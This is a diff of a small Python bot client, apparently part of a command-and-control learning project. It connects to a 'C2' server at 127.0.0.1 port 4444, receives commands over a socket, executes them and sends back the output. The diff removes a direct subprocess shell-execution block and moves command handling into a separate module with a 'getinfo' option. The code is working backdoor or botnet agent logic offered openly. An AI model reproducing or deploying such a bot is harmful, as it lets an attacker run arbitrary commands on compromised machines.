@@ -1,7 +1,7 @@
 import socket
-import subprocess
+from modules import commands
 
-C2_SERVER = '127.0.0.1'  # IP server - Alvo
+C2_SERVER = '127.0.0.1'
 C2_PORT = 4444
 
 def connect_to_c2():
@@ -12,13 +12,12 @@ def connect_to_c2():
         command = bot.recv(1024).decode()
         if command.strip().lower() == "exit":
             break
+        elif command.strip().lower() == "getinfo":
+            result = commands.get_info()
+        else:
+            result = commands.run_command(command)
 
-        try:
-            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-        except subprocess.CalledProcessError as e:
-            output = e.output
-
-        bot.send(output)
+        bot.send(result.encode())
 
     bot.close()
 
